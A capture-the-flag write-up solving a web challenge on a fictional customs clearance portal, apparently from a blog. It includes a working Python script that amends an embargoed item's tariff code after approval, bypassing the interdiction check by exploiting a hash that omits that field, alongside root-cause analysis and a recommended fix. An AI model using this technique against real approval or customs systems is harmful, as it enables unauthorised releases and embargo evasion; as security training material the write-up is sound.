# CSCTF 2026 — Interdiction Hold Writeup

**08/11/2026**

---

> **CTF:** CSCTF 2026  
>  **Challenge:** Interdiction Hold  
>  **Category:** Web  
>  **Author:** Chronos Security  
>  **Team:** XREFctf  
>  **Writeup Author:** Mahmoud Adel

## Introduction

Hey everyone! My name is **Mahmoud Adel** — a cybersecurity enthusiast passionate about red teaming and CTFs. Today I’m walking through how I solved the **Interdiction Hold** web challenge from **CSCTF 2026**.

This was a web challenge on the Orsvane Border Revenue Service’s “Meridian Freight Clearance” portal — a duty desk where consignments awaiting customs clearance are listed, screened, and released.

One consignment, `MFC-QW75KF9`, was stuck under an interdiction hold. The hold reason on the dashboard was *“Embargoed classification declared,”* and the task was to release it and read the clearance token that comes with the release certificate.

The interesting part of the challenge was the portal’s own documentation at `/schema`, which described exactly how the approval and the release check were supposed to work.

Let’s get right into it!

---

## Initial Reconnaissance

I opened the portal overview first. The dashboard showed 8 consignments in the queue: 1 under interdiction hold, 7 awaiting release, 0 released. The holds register had a single entry:

```text
MFC-QW75KF9  CN600613  Drovic Rail Head  574,573 EUR  5 days ago
Reason: Embargoed classification declared
```

The recent activity log for that consignment showed the order of events:

```text
5 days ago  MFC-QW75KF9  Manifest lodged              Lodged by Talwyn Transit for Drovic Rail Head
5 days ago  MFC-QW75KF9  Customs approval recorded    Officer CUSTOMS-93
5 days ago  MFC-QW75KF9  Interdiction hold placed     Embargoed classification declared on lodged manifest
```

So the customs approval was recorded **before** the hold was placed. The seven other consignments on the dashboard all passed through “interdiction screen passed” and were queued for release. This one didn’t.

### Reading the interface

I pulled `/schema`. It listed the routes available to me:

- `GET /embargo-list` — embargoed HS classifications
- `GET /consignments`, `GET /consignments/{id}` — consignment and line items
- `GET /consignments/{id}/approval` — customs approval record
- `PATCH /consignments/{id}/lineitems/{k}` — post-approval amendment of a line item
- `POST /consignments/{id}/release` — release attempt

The schema also defined the approval and release models:

```json
"approval_model": {
  "binds": "sha256 of the canonical manifest over covered_fields",
  "covered_fields": ["ref", "origin", "destination", "declared_value_eur",
                     "carrier", "lineitems[].description", "lineitems[].quantity"]
},
"release_controls": [
  "approval must be APPROVED and its manifest_hash must equal the current covered-field manifest hash",
  "interdiction: no line item may declare an embargoed hs_code"
]
```

Two things caught my attention:

1. **`hs_code` is not in `covered_fields`.** The approval hash covers the description, quantity, and the consignment-level fields — but not the HS classification.
2. **The interdiction check at release time reads the current `hs_code`.** It is a separate control from the approval hash.

The PATCH route’s description was also telling: *“post-approval amendment of a line item; logged. Descriptive amendments do not re-open approval.”* That confirms post-approval amendments are an intended feature of the app, and the approval hash is what is supposed to protect the manifest from being altered underneath the approval.

### Pulling the data

`GET /embargo-list` returned six embargoed HS codes:

```text
9014.80   8409.99   9027.80   8471.50   8481.80   9022.19
```

`GET /consignments/MFC-QW75KF9` returned:

```json
{
  "id": "MFC-QW75KF9",
  "ref": "CN600613",
  "origin": "Ser-Kaldar",
  "destination": "Drovic Rail Head",
  "declared_value_eur": 574573,
  "carrier": "Talwyn Transit",
  "status": "HELD",
  "lineitems": [
    {
      "k": 0,
      "description": "5 x optical encoders",
      "quantity": 38,
      "hs_code": "8481.80"
    }
  ]
}
```

The single line item was declared as `8481.80`, which is on the embargo list. That was the exact reason for the hold.

---

## Exploitation

### The gap I was targeting

Because `hs_code` is not one of the `covered_fields`, changing it after approval does not change the manifest hash. The stored approval would still match the current covered-field manifest, so the release control *“manifest\_hash must equal the current covered-field manifest hash”* would still pass.

But the interdiction control at release time reads the **current** `hs_code`. So if I could move the HS code to something non-embargoed, without touching `description` or `quantity`, both release controls would pass:

- The approval hash would still match because I left every covered field unchanged.
- The interdiction screen would pass because the current `hs_code` would no longer be embargoed.

This is a classic check/use gap: the approval was granted against one HS code, but the enforcement decision at release uses whatever the HS code field says at that moment. The two checks read the same document but different parts of it, and the part used by enforcement isn’t protected by the part used by approval.

### First patch attempts

I wrote a small Python script that:

1. Pulled `/embargo-list`.
2. Pulled the consignment.
3. PATCHed the line item’s `hs_code` to a non-embargoed value, **keeping `description` and `quantity` identical to the original**.
4. Called `POST /consignments/MFC-QW75KF9/release`.

My first attempt used a four-digit code:

```text
PATCH 0 400 {"error": "hs_code must look like NNNN.NN"}
```

So there was a format validator. I changed to the dotted `NNNN.NN` form:

```text
PATCH 0 400 {"error": "hs_code is not a recognised tariff classification"}
```

The portal also validates against an internal tariff list — a code being absent from `/embargo-list` wasn’t enough; the portal only accepted HS codes it knew about.

At this point the strategy remained clear: I needed an HS code that was **both** recognised by the portal’s tariff list and **not** embargoed. The natural choice was a sibling subheading of the original code — the same heading `8481`, but a different, non-embargoed subheading (`8481.90`, the “parts” subheading). It shares a heading with the original classification so it exists in the tariff list, and it was not on the embargo list.

### The exploit script

This is the script I used to solve the challenge:

```python
import requests, re, json

BASE = "http://<INSTANCE>"
CID  = "MFC-QW75KF9"

s = requests.Session()

# 1) Pull the embargo list
embargoed = set(s.get(f"{BASE}/embargo-list").json()["embargo"])
print("embargoed:", embargoed)

# 2) Pull the consignment
detail = s.get(f"{BASE}/consignments/{CID}").json()
print(json.dumps(detail, indent=2))
items = detail["lineitems"]

# 3) Candidate non-embargoed HS codes. The first one that the portal
#    accepts (both format and tariff-list validation) is used.
candidates = [
    "8481.90",   # parts of the same heading as the original 8481.80
    "9031.80",
    "8479.89",
    "8536.90",
    "8542.39",
]

for item in items:
    k  = item["k"]
    hs = str(item.get("hs_code", ""))

    if hs not in embargoed:
        continue  # already fine, nothing to patch

    for code in candidates:
        if code in embargoed:
            continue

        # Keep description and quantity identical -> manifest hash unchanged.
        body = {
            "hs_code":      code,
            "description":  item["description"],
            "justification": "Corrected HS classification after post-entry review",
        }
        r = s.patch(f"{BASE}/consignments/{CID}/lineitems/{k}", json=body)
        print(f"PATCH k={k} hs_code={code}: {r.status_code} {r.text}")

        if r.ok:
            break
    else:
        raise SystemExit("No accepted non-embargoed HS code found")

# 4) Release and read the clearance token
r = s.post(f"{BASE}/consignments/{CID}/release")
print("RELEASE", r.status_code)
print(r.text)

m = re.search(r"CSCTF\{[^}]+\}", r.text)
if m:
    print("FLAG:", m.group(0))
```

Key nuances in the exploit:

- **`description` and `quantity` are preserved exactly:** Both are included in `covered_fields`. Altering either would change the computed manifest hash and cause the approval verification to fail.
- **`justification` is supplied:** The PATCH schema requires a non-empty audit rationale.
- **Tariff code candidate selection:** `8481.90` was chosen as a valid sibling subheading under the existing heading `8481`, ensuring tariff list validation passed without triggering the embargo filter.

### Releasing

Once the HS code amendment was accepted, the release controls were satisfied:

- The approval hash matched (all `covered_fields` remained intact).
- The interdiction screen passed (the active `hs_code` was no longer in the embargo set).

The consignment status changed from `HELD`, and `POST /consignments/MFC-QW75KF9/release` returned the release certificate containing the clearance token and flag.

---

## Root Cause \& Technical Explanation

The vulnerability is an **incomplete integrity binding** combined with a **check/use split** on the consignment manifest:

1. **Incomplete coverage:** The approval manifest hash is calculated strictly over `covered_fields`, which omits `hs_code`.
2. **Independent enforcement:** The release gate independently evaluates the current `hs_code` value without checking whether it was part of the original approved manifest.

This architecture allowed a shipment’s classification to be mutated post-approval without invalidating the cryptographic hash. Consequently, a shipment originally flagged for embargoed goods could be cleared by substituting a non-embargoed sibling tariff code while keeping the physical description identical.

The proper fix requires binding every field that governs release authorization into `covered_fields`. Any attribute evaluated by policy enforcement gates must be bound into the immutable cryptographic signature of the approval.

---

## Final Result \& Flag

The consignment was successfully released, and the clearance certificate yielded the challenge flag:

```text
CSCTF{<REDACTED>}
```

The flag format was verified against the competition requirement. *(Note: The live flag string has been redacted per competition rules).*

---

## Conclusion \& Key Takeaways

This challenge highlights why security-critical workflows must tie policy decisions to immutable integrity boundaries:

1. **Integrity bindings must cover all decision-making fields:** If a decision engine checks attribute $X$ at execution time, $X$ must be bound to the preceding approval check. Omitting policy inputs from the integrity signature creates a check/use divergence.
2. **Post-approval amendments are high risk:** If business logic allows post-approval edits, any edit to a field that impacts authorization or compliance must invalidate prior sign-offs and trigger re-approval.
3. **Understand tariff classifications in business logic:** When applications validate input against domain taxonomies (like HS tariff codes), knowing how headings and subheadings are structured helps construct valid bypass candidates quickly.

---

## AI Methodology

During this challenge, I used an AI assistant for:

- Discussing the `/schema` definition and analyzing the integrity discrepancy in `covered_fields`.
- Drafting the initial Python script structure for querying the API and handling candidate HS codes.
- Structuring and refining this technical writeup.

All requests were executed against the live challenge instance from my own workstation, and I inspected and verified every HTTP response directly.

*No live flags, credentials, tokens, or instance URLs are included in this writeup.*

---

*Thanks for reading — hope this writeup helped someone learn something new. Happy hacking!*

[This post](https://m2hmoud2del.github.io/posts/csctf-2026-interdiction-hold/) is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.
